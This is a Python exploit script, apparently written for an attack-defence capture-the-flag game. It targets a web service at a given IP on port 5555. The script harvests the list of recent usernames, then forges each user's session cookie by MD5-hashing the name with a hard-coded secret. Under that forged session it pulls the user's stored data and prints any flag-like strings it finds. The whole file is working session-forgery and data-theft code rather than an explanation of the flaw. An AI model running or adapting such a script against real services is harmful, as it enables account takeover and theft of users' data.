#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests, requests.cookies
import string, random, uuid, re
from storage import storage_set, storage_get
import hashlib

ip = sys.argv[1]




s = requests.Session()

def generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

username = generator()
password = generator()
mail = ''.join(generator() + '@mail.ru')


auth = {
    'login' : username,
    'password' : password,
    'form' : 'submit'
}

s.post('http://{}:5555/login.html'.format(ip),data=auth, timeout=(None,None))
s.post('http://{}:5555/register.html'.format(ip),data=auth, timeout=(None,None))

html = s.get('http://{}:5555/lastusers'.format(ip)).text
users = html.split('<br>')


s.close()




for user in users:
    if not storage_get(ip + ':' + user):
        s = requests.Session()
        m = hashlib.md5()
        payload = user + 'keepitsecret'
        m.update(payload.encode())
        jar = requests.cookies.RequestsCookieJar()
        one = requests.cookies.RequestsCookieJar()
        one.set('session', user + ':' + m.hexdigest())
        s.cookies = one
        html = s.post('http://{}:5555/icecreams'.format(ip), timeout=(None,None))
        print(re.findall('[A-Z0-9]{31}=', html.text), flush=True)
        storage_set(ip + ':' + user)
        s.close()






